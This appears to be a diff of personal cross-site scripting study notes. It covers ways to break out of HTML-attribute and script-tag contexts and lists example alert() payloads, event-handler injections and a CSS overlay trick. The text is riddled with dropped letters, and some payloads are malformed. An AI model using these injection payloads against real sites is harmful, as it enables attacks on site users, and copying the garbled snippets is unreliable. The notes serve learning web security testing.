@@ -8,12 +8,12 @@
 6. Tips
 
 **Cheat Sheet**
-[Portswigger Cheat Sheet]: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
-[Above Downloaded File]: /sec/web/xss/xss-cheat-sheet.pdf
+Portswigger Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+Above Downloaded File: /sec/web/xss/xss-cheat-sheet.pdf
 
 **Other Resources**
-[AppSecEU Slides & Videos]: https://2017.appsec.eu/slides-and-videos
-[Course]: https://chefsecure.com/courses/xss
+AppSecEU Slides & Videos: https://2017.appsec.eu/slides-and-videos
+Course: https://chefsecure.com/courses/xss
 
 **Strategy**
 1. Look At the Context I'm Injecting In
@@ -58,24 +58,19 @@ jsnice.org
 
 
 ## [Contextual Execution] (1) - HTML Attributes
-+ Us: Html Atributs, Html Tags, & JS Functions
-``` 
-Tempte:              | Example:
-                     |
-    ---- attrbutes   |                         tag      value
-                     |                          |         |
-                     |                          V         v
- tag "value"         | <h1 class "hover-title" title="something">Hover</h1>
-```
+    + Us: Html Atributs, Html Tags, & JS Functions
+    ``` 
+    <tag attribute="attribute_value"> Element </tag> 
+    ```
 
 ### Breaking Out of Context 
- 1. ` - singequtoes:  `'(payload)`
- 2. ` - doubl qutoes: `"(payload)`
- 3. ace Charaters: `(space, \f, \n, \r, \t)`
+ 1. `'` - single qutoes:  `'(payload)`
+ 2. `"` - double qutoes: `"(payload)`
+ 3. Space Charaters: `(space, \f, \n, \r, \t)`
 
 + Examples
- - Bic: `"><sript>alert(document.domain)</script>`
- - Bic: `"</txtarea><script>alert(document.domain)</script>`
+ - `"><sript>alert(document.domain)</script>`
+ - `"</txtarea><script>alert(document.domain)</script>`
 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
@@ -131,21 +126,21 @@ Tempte:              | Example:
 * Secheat shet _xss-cheat-sheet.pdf_ for more
 
 + Sale Events
- - _oload_: eecutes given javascript function when tag loads
+ - _onload_: eecutes given javascript function when tag loads
   * dy Tag Exmple: `<body onload=alert(‘Welcome to Hacking Articles’)>`
- - _error_
-  * img src=ivalid onerror=alert()>`
- - _mouseover: when a user moves his cursor over a specific text
-  * a onmousever=alert(“50% discount”)>surprise</a>`
+ - _onerror_
+  * `img src=ivalid onerror=alert()>`
+ - _onmouseover: when a user moves his cursor over a specific text
+  * `a onmousever=alert(“50% discount”)>surprise</a>`
  - _c._
  
 
-+ Exples
- - `nload=alet'()`  --->  `class ='title 'onload'='alert()'`
++ Examples
+ - `'onload=alert'()`  --->  `class ='title 'onload'='alert()'`
 
 
 + Us**CSS Stying** to change _how things appear_ on the website
- - C use `stye`                                                           v--- url encoding
+ - C use `style`                                                           v--- url encoding
  - Emple: `'omouseover=alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`
                                                                           ^--- % is \x25
                                                                           
@@ -159,9 +154,9 @@ Tempte:              | Example:
 
 
 ## [Contextual Execution] (4) - Inside JS `<script>` Tags
-* Us: JS Arras/comments/functions/numbers/strings/objects/operators/template literals
-* Brser will parse Html BEFORE running JS_
-* Th **assume you're input/source is INSIDE** `<script>` & `</script>`
+* Use: JS Arrays/comments/functions/numbers/strings/objects/operators/template literals
+* _Browser will parse Html BEFORE running JS_
+* Then **assume you're input/source is INSIDE** `<script>` & `</script>`
 
      - - - -  - - - - - - - - - - - - - - - - - - - - - - - - -
 
@@ -169,44 +164,43 @@ Tempte:              | Example:
     + To _preent errors_, surround payload with _proper quotes_ and `+`s or `-`s
      - In thetemplates below the `'`, `"`, `backticks` are used to _exit the string context_
      - Then te `+` or `-` help prevent the JS for failing
-    ``Templats
-    script>
+    ```Templats
+    <script>
        ''+payoad+''   ''-payload-''
        ""+payoad+""   ""-payload-""
        ``+payoad+``   ``-payload-``
-    /script>
-    ``
-    ``Example
-    script>
+    </script>
+    ```
+    ```Example
+    <script>
      ''+alert)+'' 
       var inpt = ''+alert()+''
-    /script>
-    ``
-    
+    </script>
+    ```
     + When usng the **backtick**, while it can be used in a string, it can also _hold code_:
-    `BACKTICK_Inject_Code
+    `BACKTICK_Inject_Code`
     `${code}`
     `${alert(}`
     ^---------- Only works on backticks (not "" or '')
-    `
 
-    + Use a _losing with an opening_ tag `</script><script>`
-    ```Exampl
-    script>
+    + Use a _closing with an opening_ tag `</script><script>`
+    ```Example
+    <script>
     let s = '/script><script>alert()//'
-    /script>
+    </script>
     ```
 
      - - - -  - - - - - - - - - - - - - - - - - - - - - - - - -
 
 
      **Break ut of Array Context** within `<script>` & `</script>`
-    ``',alert'
+    ```
+    ',alert'
     1,'',aler(),'']
     `
     `',x:aler(),'
     umber:1,nme'',x:alert(),y:''}
-    ``
+    ```
 
      ===========================================================
 
@@ -305,7 +299,7 @@ Tempte:              | Example:
   ">
   
   <script nonce="rAnd0m">
-  	doWhatever();
+     doWhatever();
   </script>
   ```
 
